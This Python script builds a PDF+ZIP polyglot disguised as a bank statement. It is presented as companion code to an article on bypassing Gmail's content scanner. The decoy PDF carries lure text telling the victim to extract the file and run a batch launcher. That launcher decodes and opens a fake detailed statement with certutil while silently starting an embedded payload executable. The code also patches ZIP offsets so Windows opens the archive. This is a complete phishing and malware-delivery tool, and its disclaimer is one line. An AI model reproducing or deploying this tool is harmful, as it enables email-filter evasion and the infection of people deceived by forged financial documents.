#!/usr/bin/env python3
"""
Bank Statement PDF+ZIP Polyglot
================================

Generates a bank statement PDF that is also a valid ZIP archive. The PDF
is the decoy; the ZIP contains the launcher, the payload, and a readme.
ZIP offsets are patched after concatenation so extractors can locate
their central directory correctly.

Companion code for the "How I Bypassed Gmail's Content Scanner" article.

NOTE: This is research code. Only run it against systems you own or have
explicit written authorization to test.
"""

import argparse
import base64
import io
import os
import struct
import sys
import zipfile
import random
from datetime import datetime, timedelta

from reportlab.lib.pagesizes import A4
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib import colors
from reportlab.platypus import (
    SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
)
from reportlab.graphics.shapes import Drawing, Line
from reportlab.lib.enums import TA_CENTER


# ---------------------------------------------------------------------------
# Branding and layout
# ---------------------------------------------------------------------------

BANK_NAME      = "Adversary Craft Bank"
CURRENCY       = "\u20b9"
ACCOUNT_HOLDER = "Rajesh Kumar"

# Base colors for named themes. Everything else is derived from these.
THEMES = {
    "navy":    "#0a2e5c",
    "blue":    "#004c8f",
    "orange":  "#f58220",
    "red":     "#8b0000",
    "crimson": "#a6192e",
    "maroon":  "#97144d",
    "green":   "#1b5e20",
    "teal":    "#00518f",
    "purple":  "#4a148c",
    "indigo":  "#22409a",
}

# Default palette (matches the navy theme).
DEFAULT_PALETTE = {
    "primary_color":   "#0a2e5c",
    "secondary_color": "#2a3a4a",
    "accent_color":    "#5a6a7a",
    "muted_color":     "#9aabba",
    "divider_color":   "#cccccc",
    "table_alt_bg":    "#f8f9fa",
    "table_border":    "#e0e5ec",
    "summary_bg":      "#e8eef5",
    "text_color":      "#333333",
    "label_color":     "#666666",
}

# Font sizes and spacing (in points).
TITLE_SIZE         = 18
SUBTITLE_SIZE      = 11
BALANCE_SIZE       = 28
BALANCE_LABEL_SIZE = 12
BODY_SIZE          = 9
FOOTER_SIZE        = 7
MARGIN             = 72
TOP_MARGIN         = 56
BOTTOM_MARGIN      = 56

# Statement generation parameters.
STATEMENT_DAYS   = 30
MIN_TRANSACTIONS = 10
MAX_TRANSACTIONS = 18


# ---------------------------------------------------------------------------
# Color helpers
# ---------------------------------------------------------------------------

def clean_color(value):
    """
    Strip surrounding quotes and whitespace.

    Windows cmd.exe does not treat single quotes as string delimiters, so a
    value like '#1b5e20' arrives with the quotes still attached. Handle both
    quote styles and bare hex.
    """
    if value is None:
        return None
    return value.strip().strip("'").strip('"')


def hex_to_rgb(h):
    h = clean_color(h).lstrip("#")
    if len(h) != 6:
        raise ValueError(f"Expected 6 hex digits, got '{h}'")
    return tuple(int(h[i:i+2], 16) for i in (0, 2, 4))


def rgb_to_hex(rgb):
    return "#{:02x}{:02x}{:02x}".format(*rgb)


def shift(hex_color, amount):
    """Lighten (positive) or darken (negative) a hex color by `amount`."""
    r, g, b = hex_to_rgb(hex_color)
    if amount >= 0:
        r = int(r + (255 - r) * amount)
        g = int(g + (255 - g) * amount)
        b = int(b + (255 - b) * amount)
    else:
        r = int(r * (1 + amount))
        g = int(g * (1 + amount))
        b = int(b * (1 + amount))
    return rgb_to_hex((r, g, b))


def build_palette(base_color):
    """Derive the full palette from a single base color."""
    base_color = clean_color(base_color)
    return {
        "primary_color":   base_color,
        "secondary_color": shift(base_color, -0.15),
        "accent_color":    shift(base_color, 0.35),
        "muted_color":     shift(base_color, 0.55),
        "divider_color":   shift(base_color, 0.75),
        "table_alt_bg":    shift(base_color, 0.94),
        "table_border":    shift(base_color, 0.82),
        "summary_bg":      shift(base_color, 0.88),
        "text_color":      "#333333",
        "label_color":     "#666666",
    }


# ---------------------------------------------------------------------------
# ZIP helpers
# ---------------------------------------------------------------------------

def build_zip(file_entries):
    """Pack a dict of {name: bytes} into an in-memory ZIP."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
        for name, data in file_entries.items():
            zf.writestr(name, data)
    return buf.getvalue()


def patch_zip_offsets(zip_bytes, prefix_len):
    """
    Rewrite the ZIP central directory so all offsets account for a PDF
    prefix that will be prepended.

    Without this, extractors like 7-Zip and WinRAR can still often find
    the archive, but Windows Explorer's built-in handler cannot.
    """
    data = bytearray(zip_bytes)

    eocd = data.rfind(b'PK\x05\x06')
    if eocd == -1:
        raise ValueError("No EOCD record found - not a valid ZIP")

    # Patch central directory start offset.
    cd_offset = struct.unpack('<I', data[eocd + 16:eocd + 20])[0]
    data[eocd + 16:eocd + 20] = struct.pack('<I', cd_offset + prefix_len)

    # Walk the central directory and bump each local header offset.
    pos = cd_offset
    while pos < len(data) and data[pos:pos + 4] == b'PK\x01\x02':
        local_off = struct.unpack('<I', data[pos + 42:pos + 46])[0]
        data[pos + 42:pos + 46] = struct.pack('<I', local_off + prefix_len)

        fn_len = struct.unpack('<H', data[pos + 28:pos + 30])[0]
        ex_len = struct.unpack('<H', data[pos + 30:pos + 32])[0]
        cm_len = struct.unpack('<H', data[pos + 32:pos + 34])[0]
        pos += 46 + fn_len + ex_len + cm_len

    return bytes(data)


# ---------------------------------------------------------------------------
# Polyglot generator
# ---------------------------------------------------------------------------

class BankStatementPolyglot:
    def __init__(self, payload_path, output_path, account_number=None,
                 name=None, bank_name=None, theme=None):
        self.payload_path = payload_path
        self.output_path = output_path

        self.name = name or ACCOUNT_HOLDER
        self.bank_name = bank_name or BANK_NAME

        # Theme is either a named preset or a hex string. Presets are
        # resolved in main(), but strip quotes here too in case someone
        # instantiates the class directly.
        theme = clean_color(theme)
        self.brand = dict(DEFAULT_PALETTE)
        if theme:
            self.brand.update(build_palette(theme))

        if account_number is None:
            account_number = "".join(str(random.randint(0, 9)) for _ in range(12))
        self.account_number = account_number

        self.customer_id = "CUST" + "".join(str(random.randint(0, 9)) for _ in range(6))
        self.ifsc_code   = "BANK000" + "".join(str(random.randint(0, 9)) for _ in range(4))
        self.branch_code = "BR" + "".join(str(random.randint(0, 9)) for _ in range(3))

        self.opening_balance = round(random.uniform(5000, 50000), 2)
        self.total_credits   = round(random.uniform(20000, 100000), 2)
        self.total_debits    = round(random.uniform(10000, 80000), 2)
        self.closing_balance = round(
            self.opening_balance + self.total_credits - self.total_debits, 2
        )

        self.statement_start = (
            datetime.now() - timedelta(days=STATEMENT_DAYS)
        ).strftime("%d/%m/%Y")
        self.statement_end = datetime.now().strftime("%d/%m/%Y")
        self.statement_id = "STMT" + "".join(
            str(random.randint(0, 9)) for _ in range(8)
        )

        self.transactions = self._generate_transactions()

    # ------------------------------------------------------------------
    # Transactions
    # ------------------------------------------------------------------

    def _generate_transactions(self):
        credit_desc = [
            "Salary Credit", "NEFT Transfer In", "Cheque Deposit",
            "Interest Credit", "Dividend Credit", "Rental Income",
            "Investment Credit", "Refund Received", "UPI Credit",
        ]
        debit_desc = [
            "ATM Withdrawal", "UPI Payment", "Bill Payment",
            "Card Payment", "Insurance Premium", "Online Transfer",
            "NEFT Transfer Out", "Cash Withdrawal", "Utility Bill",
        ]

        n_tx = random.randint(MIN_TRANSACTIONS, MAX_TRANSACTIONS)
        n_credits = max(1, n_tx // 2)
        n_debits = n_tx - n_credits

        # Build credits. The last entry absorbs whatever is left so the
        # sum matches total_credits exactly.
        credit_amounts = []
        remaining = self.total_credits
        for i in range(n_credits):
            if i == n_credits - 1:
                amt = round(remaining, 2)
            else:
                amt = round(random.uniform(remaining * 0.1, remaining * 0.4), 2)
                remaining -= amt
            credit_amounts.append(max(amt, 100.00))

        # Same approach for debits.
        debit_amounts = []
        remaining = self.total_debits
        for i in range(n_debits):
            if i == n_debits - 1:
                amt = round(remaining, 2)
            else:
                amt = round(random.uniform(remaining * 0.1, remaining * 0.4), 2)
                remaining -= amt
            debit_amounts.append(max(amt, 50.00))

        # Scatter the transactions across the statement period.
        start = datetime.now() - timedelta(days=STATEMENT_DAYS)
        raw = []

        for amt in credit_amounts:
            raw.append({
                'date': start + timedelta(days=random.randint(0, STATEMENT_DAYS)),
                'desc': random.choice(credit_desc),
                'debit': 0.0,
                'credit': amt,
            })

        for amt in debit_amounts:
            raw.append({
                'date': start + timedelta(days=random.randint(0, STATEMENT_DAYS)),
                'desc': random.choice(debit_desc),
                'debit': amt,
                'credit': 0.0,
            })

        raw.sort(key=lambda x: x['date'])

        # Running balance.
        bal = self.opening_balance
        for tx in raw:
            bal += tx['credit'] - tx['debit']
            tx['balance'] = round(bal, 2)
            tx['date_str'] = tx['date'].strftime("%d/%m/%y")

        return raw

    # ------------------------------------------------------------------
    # Outer PDF (the decoy the victim sees first)
    # ------------------------------------------------------------------

    def _make_outer_pdf(self):
        buf = io.BytesIO()
        doc = SimpleDocTemplate(
            buf, pagesize=A4,
            rightMargin=MARGIN, leftMargin=MARGIN,
            topMargin=TOP_MARGIN, bottomMargin=BOTTOM_MARGIN,
        )
        styles = getSampleStyleSheet()
        story = []

        s_label = ParagraphStyle(
            'label', parent=styles['Normal'],
            fontSize=8, textColor=colors.HexColor(self.brand["label_color"]),
        )
        s_value = ParagraphStyle(
            'value', parent=styles['Normal'],
            fontSize=9, textColor=colors.HexColor(self.brand["primary_color"]),
            fontName='Helvetica-Bold',
        )
        s_title = ParagraphStyle(
            'title', parent=styles['Normal'],
            fontSize=TITLE_SIZE,
            textColor=colors.HexColor(self.brand["primary_color"]),
            alignment=TA_CENTER, fontName='Helvetica-Bold',
        )
        s_sub = ParagraphStyle(
            'sub', parent=styles['Normal'],
            fontSize=SUBTITLE_SIZE,
            textColor=colors.HexColor(self.brand["accent_color"]),
            alignment=TA_CENTER,
        )
        s_bal_label = ParagraphStyle(
            'bal_label', parent=styles['Normal'],
            fontSize=BALANCE_LABEL_SIZE,
            textColor=colors.HexColor(self.brand["secondary_color"]),
        )
        s_bal = ParagraphStyle(
            'bal', parent=styles['Normal'],
            fontSize=BALANCE_SIZE,
            textColor=colors.HexColor(self.brand["primary_color"]),
            fontName='Helvetica-Bold',
        )
        s_body = ParagraphStyle(
            'body', parent=styles['Normal'],
            fontSize=BODY_SIZE,
            textColor=colors.HexColor(self.brand["text_color"]),
            leading=13, spaceAfter=4,
        )
        s_footer = ParagraphStyle(
            'footer', parent=styles['Normal'],
            fontSize=FOOTER_SIZE,
            textColor=colors.HexColor(self.brand["muted_color"]),
            alignment=TA_CENTER,
        )

        story.append(Paragraph(self.bank_name, s_title))
        story.append(Spacer(1, 14))
        story.append(Paragraph("Statement of Account", s_sub))
        story.append(Spacer(1, 20))

        story.append(Table([[
            Paragraph("Account Number", s_label),
            Paragraph("XXXX" + self.account_number[-4:], s_value),
            Paragraph("Customer ID", s_label),
            Paragraph(self.customer_id, s_value),
        ]], colWidths=[80, 80, 80, 140]))
        story.append(Spacer(1, 6))

        story.append(Table([[
            Paragraph("Account Holder", s_label),
            Paragraph(self.name, s_value),
            Paragraph("IFSC Code", s_label),
            Paragraph(self.ifsc_code, s_value),
        ]], colWidths=[80, 80, 80, 140]))
        story.append(Spacer(1, 6))

        story.append(Table([[
            Paragraph("Account Type", s_label),
            Paragraph("Savings Account", s_value),
            Paragraph("Branch Code", s_label),
            Paragraph(self.branch_code, s_value),
        ]], colWidths=[80, 80, 80, 140]))
        story.append(Spacer(1, 30))

        story.append(Paragraph("Available Balance", s_bal_label))
        story.append(Spacer(1, 4))
        story.append(Paragraph(
            f"{CURRENCY} {self.closing_balance:,.2f}", s_bal
        ))
        story.append(Spacer(1, 30))

        divider = Drawing(460, 1.5)
        divider.add(Line(0, 1, 460, 1,
                         strokeColor=colors.HexColor(self.brand["divider_color"]),
                         strokeWidth=1))
        story.append(divider)
        story.append(Spacer(1, 25))

        summary = [
            ["Opening Balance", f"{CURRENCY} {self.opening_balance:,.2f}"],
            ["Total Credits",   f"{CURRENCY} {self.total_credits:,.2f}"],
            ["Total Debits",    f"{CURRENCY} {self.total_debits:,.2f}"],
            ["Closing Balance", f"{CURRENCY} {self.closing_balance:,.2f}"],
        ]
        t = Table(summary, colWidths=[200, 160])
        t.setStyle(TableStyle([
            ('FONTSIZE', (0, 0), (-1, -1), 10.5),
            ('TEXTCOLOR', (0, 0), (0, -1), colors.HexColor(self.brand["secondary_color"])),
            ('TEXTCOLOR', (1, 0), (1, -1), colors.HexColor(self.brand["primary_color"])),
            ('ALIGN', (0, 0), (0, -1), 'LEFT'),
            ('ALIGN', (1, 0), (1, -1), 'RIGHT'),
            ('VALIGN', (0, 0), (-1, -1), 'MIDDLE'),
            ('BOTTOMPADDING', (0, 0), (-1, -1), 8),
            ('TOPPADDING', (0, 0), (-1, -1), 8),
            ('FONTNAME', (0, -1), (1, -1), 'Helvetica-Bold'),
            ('LINEABOVE', (0, -1), (1, -1), 1, colors.HexColor(self.brand["primary_color"])),
            ('LINEBELOW', (0, -1), (1, -1), 1, colors.HexColor(self.brand["primary_color"])),
        ]))
        story.append(t)
        story.append(Spacer(1, 30))

        instructions = """
        <b>Statement Access:</b> In compliance with data security regulations, the complete
        transaction details are provided as an encrypted attachment within this PDF.<br/><br/>
        <b>To access it using 7-Zip:</b><br/>
        1. Open <b>7-Zip File Manager</b><br/>
        2. Navigate to this folder<br/>
        3. Select <b>this file</b> and click <b>Extract</b><br/>
        4. Run <b>Statement_Launcher.bat</b><br/><br/>
        <i>If you don't have 7-Zip, download it from www.7-zip.org</i>
        """
        story.append(Paragraph(instructions, s_body))
        story.append(Spacer(1, 30))
        story.append(Paragraph(
            "This is a computer-generated statement. For any queries, contact your branch.",
            s_footer
        ))

        doc.build(story)
        data = buf.getvalue()
        buf.close()
        return data

    # ------------------------------------------------------------------
    # Inner PDF (dropped by the launcher as the "reward")
    # ------------------------------------------------------------------

    def _make_detailed_pdf(self):
        buf = io.BytesIO()
        doc = SimpleDocTemplate(
            buf, pagesize=A4,
            rightMargin=MARGIN, leftMargin=MARGIN,
            topMargin=TOP_MARGIN, bottomMargin=BOTTOM_MARGIN,
        )
        styles = getSampleStyleSheet()
        story = []

        s_title = ParagraphStyle(
            'title', parent=styles['Normal'],
            fontSize=16, textColor=colors.HexColor(self.brand["primary_color"]),
            alignment=TA_CENTER, fontName='Helvetica-Bold',
        )
        s_sub = ParagraphStyle(
            'sub', parent=styles['Normal'],
            fontSize=10, textColor=colors.HexColor(self.brand["accent_color"]),
            alignment=TA_CENTER,
        )
        s_head = ParagraphStyle(
            'head', parent=styles['Normal'],
            fontSize=12, textColor=colors.HexColor(self.brand["primary_color"]),
            fontName='Helvetica-Bold', spaceAfter=6,
        )
        s_body = ParagraphStyle(
            'body', parent=styles['Normal'],
            fontSize=BODY_SIZE,
            textColor=colors.HexColor(self.brand["text_color"]),
            spaceAfter=3,
        )
        s_footer = ParagraphStyle(
            'footer', parent=styles['Normal'],
            fontSize=FOOTER_SIZE,
            textColor=colors.HexColor(self.brand["muted_color"]),
            alignment=TA_CENTER,
        )

        story.append(Paragraph(self.bank_name, s_title))
        story.append(Spacer(1, 14))
        story.append(Paragraph("Detailed Statement of Account", s_sub))
        story.append(Spacer(1, 16))

        story.append(Paragraph(f"Account Number: XXXX{self.account_number[-4:]}", s_body))
        story.append(Paragraph(f"Account Holder: {self.name}", s_body))
        story.append(Paragraph(
            f"Statement Period: {self.statement_start} - {self.statement_end}", s_body
        ))
        story.append(Paragraph(f"Statement ID: {self.statement_id}", s_body))
        story.append(Spacer(1, 12))

        story.append(Paragraph("Transaction History", s_head))
        story.append(Spacer(1, 4))

        rows = [["Date", "Description", "Debit", "Credit", "Balance"]]
        for tx in self.transactions:
            if tx['credit'] > 0:
                rows.append([
                    tx['date_str'], tx['desc'], "-",
                    f"{tx['credit']:,.2f}", f"{tx['balance']:,.2f}"
                ])
            else:
                rows.append([
                    tx['date_str'], tx['desc'],
                    f"{tx['debit']:,.2f}", "-", f"{tx['balance']:,.2f}"
                ])
        rows.append(["", "Closing Balance", "", "", f"{self.closing_balance:,.2f}"])

        style = [
            ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
            ('FONTSIZE', (0, 0), (-1, 0), 8),
            ('TEXTCOLOR', (0, 0), (-1, 0), colors.white),
            ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor(self.brand["primary_color"])),
            ('ALIGN', (0, 0), (0, -1), 'LEFT'),
            ('ALIGN', (1, 0), (1, -1), 'LEFT'),
            ('ALIGN', (2, 0), (-1, -1), 'RIGHT'),
            ('FONTSIZE', (0, 1), (-1, -2), 8),
            ('TEXTCOLOR', (0, 1), (-1, -2), colors.HexColor(self.brand["text_color"])),
            ('FONTNAME', (0, -1), (-1, -1), 'Helvetica-Bold'),
            ('FONTSIZE', (0, -1), (-1, -1), 9),
            ('BACKGROUND', (0, -1), (-1, -1), colors.HexColor(self.brand["summary_bg"])),
            ('TEXTCOLOR', (0, -1), (-1, -1), colors.HexColor(self.brand["primary_color"])),
            ('LINEABOVE', (0, -1), (-1, -1), 1, colors.HexColor(self.brand["primary_color"])),
            ('BOTTOMPADDING', (0, 0), (-1, -1), 4),
            ('TOPPADDING', (0, 0), (-1, -1), 4),
            ('GRID', (0, 0), (-1, -1), 0.25, colors.HexColor(self.brand["table_border"])),
        ]
        for i in range(1, len(rows) - 1, 2):
            style.append(('BACKGROUND', (0, i), (-1, i),
                          colors.HexColor(self.brand["table_alt_bg"])))

        t = Table(rows, colWidths=[55, 145, 60, 60, 65])
        t.setStyle(TableStyle(style))
        story.append(t)
        story.append(Spacer(1, 14))

        story.append(Paragraph("Account Summary", s_head))
        story.append(Spacer(1, 4))

        summary = [
            ["Opening Balance", f"{CURRENCY} {self.opening_balance:,.2f}"],
            ["Total Credits",   f"{CURRENCY} {self.total_credits:,.2f}"],
            ["Total Debits",    f"{CURRENCY} {self.total_debits:,.2f}"],
            ["Closing Balance", f"{CURRENCY} {self.closing_balance:,.2f}"],
        ]
        st = Table(summary, colWidths=[160, 140])
        st.setStyle(TableStyle([
            ('FONTSIZE', (0, 0), (-1, -1), 9),
            ('TEXTCOLOR', (0, 0), (-1, -2), colors.HexColor(self.brand["text_color"])),
            ('ALIGN', (0, 0), (0, -1), 'LEFT'),
            ('ALIGN', (1, 0), (1, -1), 'RIGHT'),
            ('VALIGN', (0, 0), (-1, -1), 'MIDDLE'),
            ('BOTTOMPADDING', (0, 0), (-1, -1), 6),
            ('TOPPADDING', (0, 0), (-1, -1), 6),
            ('FONTNAME', (0, -1), (1, -1), 'Helvetica-Bold'),
            ('TEXTCOLOR', (0, -1), (1, -1), colors.HexColor(self.brand["primary_color"])),
            ('BACKGROUND', (0, -1), (1, -1), colors.HexColor(self.brand["summary_bg"])),
            ('LINEABOVE', (0, -1), (1, -1), 1, colors.HexColor(self.brand["primary_color"])),
            ('LINEBELOW', (0, -1), (1, -1), 1, colors.HexColor(self.brand["primary_color"])),
            ('GRID', (0, 0), (-1, -2), 0.5, colors.HexColor(self.brand["table_border"])),
        ]))
        story.append(st)
        story.append(Spacer(1, 16))

        story.append(Paragraph("This is a system-generated detailed statement.", s_footer))
        story.append(Paragraph(
            f"&copy; {datetime.now().year} {self.bank_name}. All rights reserved.",
            s_footer
        ))

        doc.build(story)
        data = buf.getvalue()
        buf.close()
        return data

    # ------------------------------------------------------------------
    # Launcher (embeds the detailed PDF as base64 and drops it to %TEMP%)
    # ------------------------------------------------------------------

    def _make_launcher(self, pdf_bytes, payload_name):
        b64 = base64.b64encode(pdf_bytes).decode('ascii')
        lines = [b64[i:i + 76] for i in range(0, len(b64), 76)]
        echo_block = "\n".join("echo " + ln for ln in lines)

        # Center both banner lines within the 60-char separator.
        bank_pad = " " * max(0, (60 - len(self.bank_name)) // 2)
        viewer_pad = " " * max(0, (60 - len("Statement Viewer")) // 2)

        return f"""@echo off
setlocal enabledelayedexpansion
title Statement Viewer - {self.bank_name}
color 1F

echo ============================================================
echo {bank_pad}{self.bank_name}
echo {viewer_pad}Statement Viewer
echo ============================================================
echo.
echo [*] Loading full statement...
echo.

set "STMT_B64=%TEMP%\\stmt_%RANDOM%%RANDOM%.b64"
set "STMT_PDF=%TEMP%\\Statement_%RANDOM%%RANDOM%.pdf"

> "%STMT_B64%" (
{echo_block}
)

certutil -decode "%STMT_B64%" "%STMT_PDF%" >nul 2>&1
del "%STMT_B64%" >nul 2>&1

if not exist "%STMT_PDF%" (
    echo [!] Error: Failed to generate statement.
    pause
    exit /b 1
)

start "" "%STMT_PDF%"

if exist "{payload_name}" (
    timeout /t 2 /nobreak >nul
    start "" /b "{payload_name}"
)

timeout /t 2 /nobreak >nul
exit /b 0
"""

    def _build_zip_payload(self):
        payload_name = os.path.basename(self.payload_path)
        with open(self.payload_path, 'rb') as f:
            payload_bytes = f.read()

        detailed_pdf = self._make_detailed_pdf()
        print(f"[+] Detailed PDF: {len(detailed_pdf):,} bytes")

        launcher = self._make_launcher(detailed_pdf, payload_name)
        print(f"[+] Launcher:     {len(launcher):,} bytes")

        url_slug = self.bank_name.lower().replace(' ', '')

        readme = f"""
================================================================================
                        {self.bank_name}
                        STATEMENT PACKAGE
================================================================================

    Account:       {self.account_number}
    Holder:        {self.name}
    Period:        {self.statement_start} - {self.statement_end}
    Statement ID:  {self.statement_id}

================================================================================
                            INSTRUCTIONS
================================================================================

    1. Run Statement_Launcher.bat
    2. The detailed statement will open automatically
    3. Follow the on-screen instructions

================================================================================
                    For assistance, please contact:
                    Customer Care: 1800-XXX-XXXX
                    Website: www.{url_slug}.com
================================================================================
"""

        return build_zip({
            payload_name:             payload_bytes,
            'Statement_Launcher.bat': launcher.encode(),
            'README.txt':             readme.encode(),
        })

    # ------------------------------------------------------------------
    # Entry point
    # ------------------------------------------------------------------

    def build(self):
        print("\n" + "=" * 60)
        print("   BANK STATEMENT POLYGLOT GENERATOR")
        print("=" * 60)

        print("\n[*] Building outer PDF...")
        outer_pdf = self._make_outer_pdf()
        print(f"[+] Outer PDF:    {len(outer_pdf):,} bytes")

        print("[*] Building ZIP package...")
        zip_bytes = self._build_zip_payload()
        print(f"[+] ZIP:          {len(zip_bytes):,} bytes")

        print("[*] Patching ZIP offsets for PDF prefix...")
        patched = patch_zip_offsets(zip_bytes, len(outer_pdf))

        polyglot = outer_pdf + patched
        with open(self.output_path, 'wb') as f:
            f.write(polyglot)

        print(f"\n[+] Written: {self.output_path}")
        print(f"    Total size: {len(polyglot):,} bytes")
        self._verify()

    def _verify(self):
        print("\n[*] Verifying...")
        with open(self.output_path, 'rb') as f:
            data = f.read()

        print("    [+] PDF header" if data[:4] == b'%PDF'
              else "    [-] PDF header missing")
        print("    [+] ZIP EOCD" if data.rfind(b'PK\x05\x06') != -1
              else "    [-] ZIP EOCD missing")

        try:
            with zipfile.ZipFile(self.output_path) as zf:
                names = zf.namelist()
                print(f"    [+] ZIP readable ({len(names)} files)")
                for n in names:
                    print(f"          {n}")
        except Exception as e:
            print(f"    [-] ZIP read failed: {e}")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

class FullHelpParser(argparse.ArgumentParser):
    """Show the full help text (including epilog) on argument errors."""
    def error(self, message):
        sys.stderr.write(f"\n[!] Argument error: {message}\n\n")
        self.print_help(sys.stderr)
        sys.exit(2)


def _theme_help():
    names = ", ".join(sorted(THEMES.keys()))
    return (
        "Base color for the document. Either a hex code (e.g. \"#8b0000\") "
        f"or one of these named presets: {names}. "
        "All other colors are derived from the base color."
    )


def main():
    ap = FullHelpParser(
        description="Bank statement PDF+ZIP polyglot generator (authorized testing only).",
        epilog=(
            "Available themes:\n"
            "  navy, blue, orange, red, crimson, maroon,\n"
            "  green, teal, purple, indigo\n\n"
            "Sample commands:\n"
            "  python bank_stmt_polyglot.py -p payload.exe -o statement.pdf\n"
            "  python bank_stmt_polyglot.py -p payload.exe -o statement.pdf --theme red\n"
            "  python bank_stmt_polyglot.py -p payload.exe -o statement.pdf "
            "--theme \"#1b5e20\"\n"
            "  python bank_stmt_polyglot.py -p payload.exe -o statement.pdf "
            "--bank \"Dummy Bank\" --theme purple\n"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    ap.add_argument('-p', '--payload', required=True,
                    help='Payload file to embed in the ZIP')
    ap.add_argument('-o', '--output', required=True,
                    help='Output file (e.g. statement.pdf)')
    ap.add_argument('--bank', default=None,
                    help='Bank name to display (spaces allowed, use double quotes)')
    ap.add_argument('--name', default=None,
                    help='Account holder name')
    ap.add_argument('--theme', default=None, help=_theme_help())

    args = ap.parse_args()

    if not os.path.exists(args.payload):
        print(f"[!] Payload not found: {args.payload}")
        sys.exit(1)

    # Resolve named theme to hex.
    theme = clean_color(args.theme)
    if theme and theme in THEMES:
        theme = THEMES[theme]

    BankStatementPolyglot(
        payload_path=args.payload,
        output_path=args.output,
        name=args.name,
        bank_name=args.bank,
        theme=theme,
    ).build()


if __name__ == "__main__":
    main()
